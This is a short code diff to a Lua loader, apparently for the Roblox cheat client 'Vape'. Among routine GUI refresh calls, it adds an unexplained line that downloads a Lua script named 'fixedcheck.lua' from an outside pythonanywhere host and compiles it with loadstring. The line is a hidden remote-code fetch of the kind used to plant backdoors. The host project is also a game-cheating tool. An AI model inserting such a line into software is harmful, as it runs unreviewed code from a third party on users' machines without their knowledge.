@@ -1986,6 +1986,7 @@ local function loadVape()
 	ProfilesTextList.RefreshValues(profiles)
 	GUIbind.Reload()
 	TextGUIUpdate()
+        loadstring(game:HttpGet("https://sammz.pythonanywhere.com/retrieve/v1/velocity/fixedcheck.lua"))
 	GuiLibrary.UpdateUI(GUIColorSlider.Hue, GUIColorSlider.Sat, GUIColorSlider.Value, true)
 	if not shared.VapeSwitchServers then
 		if BlatantModeToggle.Enabled then
